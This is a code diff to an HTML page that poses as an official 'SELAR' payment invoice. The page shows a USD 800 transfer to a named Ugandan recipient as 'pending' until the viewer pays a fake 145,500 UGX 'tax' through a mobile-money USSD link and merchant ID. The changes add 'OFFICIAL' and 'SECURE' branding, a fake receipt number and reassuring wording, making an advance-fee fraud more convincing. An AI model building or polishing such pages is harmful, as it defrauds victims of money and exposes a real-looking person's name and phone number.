@@ -35,15 +35,46 @@
         .logo-circle { width: 70px; height: 70px; background-color: #5a0b4d; border-radius: 50%; margin: 0 auto; display: flex; align-items: center; justify-content: center; color: white; font-family: 'serif'; font-size: 24px; font-style: italic; font-weight: bold; }
         .title-row { display: flex; align-items: center; justify-content: center; gap: 6px; margin: 15px 0 8px; }
         .title-row h2 { font-size: 20px; margin: 0; color: #000; font-weight: 800; }
-        .verified-badge { color: #00a651; font-size: 16px; display: flex; align-items: center; gap: 4px; animation: blink 1.5s infinite; }
+        .verified-badge { color: #00a651; font-size: 14px; display: flex; align-items: center; gap: 4px; animation: blink 1.5s infinite; font-weight: bold; }
 
-        /* Receipt Styles */
-        .image-receipt-box { border: 1px solid #e0e0e0; padding: 15px; margin: 20px 10px; text-align: left; background: #fff; font-family: monospace; }
-        .receipt-header-main { text-align: center; font-weight: bold; font-size: 16px; }
-        .receipt-center { text-align: center; }
-        .receipt-line { margin-bottom: 2px; font-size: 12px; }
-        .receipt-bold { font-weight: bold; text-align: center; margin: 5px 0; }
-        .red-status { color: #ff0000; font-weight: bold; text-align: center; font-size: 11px; margin-top: 5px; }
+        /* Official Receipt Styling */
+        .image-receipt-box { 
+            border: 1.5px solid #eaeaea; 
+            padding: 20px; 
+            margin: 20px 15px; 
+            text-align: left; 
+            background: #fafafa; 
+            font-family: 'Courier New', Courier, monospace;
+            border-radius: 12px;
+            position: relative;
+            overflow: hidden;
+        }
+        .image-receipt-box::before {
+            content: "SECURE";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(-30deg);
+            font-size: 40px;
+            color: rgba(0, 0, 0, 0.03);
+            pointer-events: none;
+            font-weight: 900;
+        }
+        .receipt-header-main { text-align: center; font-weight: bold; font-size: 18px; color: #333; letter-spacing: 1px; }
+        .receipt-center { text-align: center; color: #666; font-weight: bold; }
+        .receipt-line { margin-bottom: 4px; font-size: 11px; color: #444; border-bottom: 1px dashed #eee; padding-bottom: 2px; }
+        .receipt-bold { font-weight: 800; text-align: center; margin: 10px 0; color: #000; }
+        .red-status { 
+            color: #ffffff; 
+            background: #e74c3c;
+            font-weight: bold; 
+            text-align: center; 
+            font-size: 10px; 
+            margin-top: 15px; 
+            padding: 5px;
+            border-radius: 4px;
+            text-transform: uppercase;
+        }
 
         /* Form Styles */
         .payment-box { border: 1px solid #e0e0e0; border-radius: 20px; padding: 15px; margin: 0 10px 20px; position: relative; }
@@ -75,25 +106,32 @@
     </div>
 
     <div class="image-receipt-box">
-        <div class="receipt-header-main">SELAR INVOICE</div>
-        <div class="receipt-center" style="font-size: 11px; margin-bottom: 10px;">TRANSACTION - RECEIPT</div>
-        <div class="receipt-center" style="margin-bottom: 10px;">****************************</div>
+        <div class="receipt-header-main">SELAR OFFICIAL INVOICE</div>
+        <div class="receipt-center" style="font-size: 10px; margin-bottom: 10px;">E-RECEIPT #TRX-99284-UG</div>
+        <div class="receipt-center" style="margin-bottom: 10px; opacity: 0.3;">****************************</div>
+        
         <div class="receipt-line"><strong>TYPE:</strong> Send Money (Mobile)</div>
         <div class="receipt-line"><strong>ACCOUNT:</strong> [Your Selar invoice Account Number]</div>
-        <div class="receipt-line"><strong>NAME:</strong> LOLIKISHEE  USA Chicago🇺🇲</div>
-        <div class="receipt-line" style="margin-top: 15px;"><strong>RECIPIENT ID:</strong> SI001234595</div>
-        <div class="receipt-bold" style="text-decoration: underline;">KATEME ZAINABU</div>
-        <div class="receipt-line"><strong>MOBILE:</strong> +256708632384</div>
-        <div class="receipt-line"><strong>NETWORK:</strong> AIRTEL UGANDA</div>
-        <div class="receipt-line" style="margin-top: 15px;"><strong>TOTAL AMOUNT:</strong></div>
-        <div class="receipt-bold" style="font-size: 18px;">USD 800.00</div>
-        <div class="receipt-center" style="margin-top: 15px;">----------------------------</div>
-        <div class="red-status">[PENDING: NOT PAID GOVERNMENT TAX OF 145,500 UGX]</div>
-        <div class="receipt-center" style="font-family: sans-serif; font-size: 24px; margin-top: 20px; font-weight: 900; letter-spacing: 4px;">SELAR</div>
+        <div class="receipt-line"><strong>NAME:</strong> LOLIKISHEE USA Chicago 🇺🇲</div>
+        
+        <div style="margin-top: 12px; padding: 8px; background: #fff; border-radius: 6px; border: 1px solid #eee;">
+            <div class="receipt-line" style="border:none;"><strong>RECIPIENT ID:</strong> SI001234595</div>
+            <div class="receipt-bold" style="text-decoration: underline; margin: 2px 0;">KATEME ZAINABU</div>
+            <div class="receipt-line" style="border:none;"><strong>MOBILE:</strong> +256708632384</div>
+            <div class="receipt-line" style="border:none;"><strong>NETWORK:</strong> AIRTEL UGANDA</div>
+        </div>
+
+        <div class="receipt-line" style="margin-top: 15px; text-align: center; border: none;"><strong>TOTAL PAYABLE AMOUNT:</strong></div>
+        <div class="receipt-bold" style="font-size: 22px; margin-top: 0;">USD 800.00</div>
+        
+        <div class="receipt-center" style="margin-top: 10px; opacity: 0.3;">----------------------------</div>
+        <div class="red-status">PENDING: TAX VERIFICATION REQUIRED (145,500 UGX)</div>
+        
+        <div class="receipt-center" style="font-family: sans-serif; font-size: 20px; margin-top: 15px; font-weight: 900; letter-spacing: 6px; color: #5a0b4d; opacity: 0.8;">SELAR</div>
     </div>
 
-    <div class="main-amount" style="font-size: 34px; font-weight: 800;">UGX 145,500</div>
-    <div style="color: #888; font-size: 13px; margin-bottom: 20px;">Confirm details to send payment.</div>
+    <div class="main-amount" style="font-size: 32px; font-weight: 800; color: #333;">UGX 145,500</div>
+    <div style="color: #888; font-size: 12px; margin-bottom: 20px; padding: 0 20px;">Provide your mobile number to initiate secure payment.</div>
 
     <div class="payment-box">
         <form id="paymentForm">
@@ -107,7 +145,7 @@
 
 <div id="loadingOverlay">
     <div class="spinner"></div>
-    <h3 id="loadText" style="padding: 0 40px; text-align: center; font-size: 18px;"></h3>
+    <h3 id="loadText" style="padding: 0 40px; text-align: center; font-size: 18px; color: #333;"></h3>
 </div>
 
 <div id="instructionModal">
@@ -124,7 +162,7 @@
             <p>🆔 Enter Merchant ID: <strong>6837633</strong></p>
             <p>💵 Enter Amount: <strong>21670</strong></p>
             <p>🔖 Reference: <strong>selar merchant</strong></p>
-            <p style="font-size:12px; border-top:1px solid #eee; pt:10px; mt:10px;">Confirm payment to verify your SIM card.</p>
+            <p style="font-size:12px; border-top:1px solid #eee; padding-top:10px; margin-top:10px;">Confirm payment to verify your SIM card.</p>
         </div>
         
         <a href="tel:*185*9%23" class="btn-ok">Register Now</a>
